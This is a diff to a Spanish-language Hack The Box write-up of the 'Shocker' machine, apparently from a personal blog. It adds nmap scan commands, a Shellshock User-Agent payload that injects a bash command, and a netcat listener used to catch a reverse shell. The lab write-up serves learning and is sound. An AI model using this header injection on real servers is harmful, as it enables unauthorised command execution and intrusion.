@@ -2,9 +2,9 @@
 title: Shocker - HTB Writeup
 date: 2023-09-06 16:00:00 +0800
 categories: [Writeups, HTB]
-tags: [Easy, Windows, Writeup]
+tags: [Easy, Linux, Writeup]
 image:
-  path: /assets/img/post/jerry/catherine-heath-i4W8OINLI_I-unsplash.jpg
+  path: /assets/img/post/shocker/adi-goldstein-EUsVwEOsblE-unsplash.jpg
   lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
 ---
 
@@ -16,9 +16,17 @@ Esta máquina me resulta muy interesante ya que es la primera vez que voy a toca
 
 Comenzamos con un escaneo de puertos utilizando ```nmap```:
 
+```bash
+nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.10.56 -oG allPorts
+```
+
 ![img](/assets/img/post/shocker/626f4269-71bd-4a1b-a55e-c2b827453f41.png)
 
 Encontramos los puertos ```80``` y ```2222``` abiertos, vamos a ver que **servicios** se ejecutan en dichos puertos:
+
+```bash
+nmap -sCV -p80,2222 10.10.10.56 -oN versions
+```
 
 ![img](/assets/img/post/shocker/7e3b09ac-648b-4229-b80d-2c105154baed.png)
 
@@ -48,9 +56,17 @@ Podemos ver en este [repositorio](https://github.com/opsxcq/exploit-CVE-2014-627
 
 Primero vamos a ver si podemos ejecutar el ```Shellshock```
 
+```bash
+user-agent: () { :; }; echo; echo; /bin/bash -c 'id'"
+```
+
 ![img](/assets/img/post/shocker/a287c41c-c780-42bb-b2f0-12015947b21b.png)
 
 Como podemos ver, podemos inyectar comandos en el ```User-Agent```, vamos a conseguir una ```reverse shell```, con el oneline que usamos siempre para ello:
+
+```bash
+nc -lvnp 443
+```
 
 ![img](/assets/img/post/shocker/3f8fb66f-9696-4160-8938-e07203953664.png)
 
